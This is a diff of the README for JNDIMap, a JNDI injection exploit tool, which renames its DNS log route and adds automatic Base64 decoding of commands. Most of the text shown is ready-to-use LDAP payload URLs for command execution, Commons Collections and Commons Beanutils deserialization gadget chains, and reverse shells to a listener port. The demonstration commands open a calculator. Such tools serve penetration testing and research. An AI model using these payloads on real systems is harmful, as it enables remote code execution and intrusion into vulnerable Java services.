@@ -4,7 +4,7 @@ JNDIMap is a JNDI injection exploit tool that supports RMI and LDAP protocols, i
 
 Features
 
-- DnsLog
+- DNS Log
 - execute command
 - native reverse shell (Windows supported)
 - load custom class bytecode
@@ -49,6 +49,8 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 Please note that all the Base64 passed in is **Base64 URL encoded**, i.e. replace `+` and `/` with `-` and `_`
 
+All routes that can execute commands support automatic Base64 URL decoding, that is, you can directly pass in plain text commands or Base64 URL encoded commands
+
 The following routes support both RMI and LDAP protocols except `/Deserialize/*` (LDAP deserialization)
 
 For the RMI protocol, simply replace `ldap://` with `rmi://` in the URL
@@ -61,11 +63,11 @@ The Java version must be less than 8u121 (RMI protocol) or 8u191 (LDAP protocol)
 
 ```bash
 # DNS request
-ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn
+ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
 
-# execute command
+# execute command (support automatic Base64 URL decoding)
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
 # load custom class bytecode
 
@@ -322,7 +324,7 @@ ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
 
 # CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and native reverse shell
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
 
 # CommonsCollectionsK2 deserialization (4.0 + TemplatesImpl), same as above
@@ -330,7 +332,7 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculato
 
 # CommonsCollectionsK3 deserialization (3.1 + Runtime.exec), only supports command execution
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
 # CommonsCollectionsK4 deserialization (4.0 + Runtime.exec), same as above
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
@@ -341,12 +343,12 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculato
 
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
 
 # 1.9.4
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 
 # Jackson native deserialization
